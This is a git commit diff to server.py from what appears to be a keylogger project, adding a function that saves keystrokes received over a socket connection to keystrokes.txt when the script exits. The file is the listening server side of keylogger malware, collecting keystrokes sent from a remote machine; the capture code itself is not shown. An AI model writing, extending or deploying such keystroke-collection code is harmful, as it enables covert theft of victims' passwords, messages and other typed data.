99c240e40775e71dbf7c2faded603d260998c48f
IVBecy <kristofhracza@gmail.com>
2021-01-21 12:01:42 +0000

    Able to generate txt file when finishing script properly

--- server.py
+++ server.py
@@ -17,13 +17,20 @@ def listener():
   print(f"Connected to {addr[0]}:{addr[1]}")
   print("\nListening for keystrokes")
   
+# Writing the whole text to a txt file
+def write_to_file(text,dest):
+  with open(dest,"w") as f:
+    f.write(text)
+    f.close()
+
 # Start listening
 if __name__ == "__main__":
   listener()
   while True:
     try:
-      print(incoming.recv(1024).decode())
+      print(incoming.recv(BUFFER).decode())
     except KeyboardInterrupt:
+      write_to_file(incoming.recv(BUFFER).decode(),"keystrokes.txt")
       print("Exiting...")
       s.close()
       sys.exit()
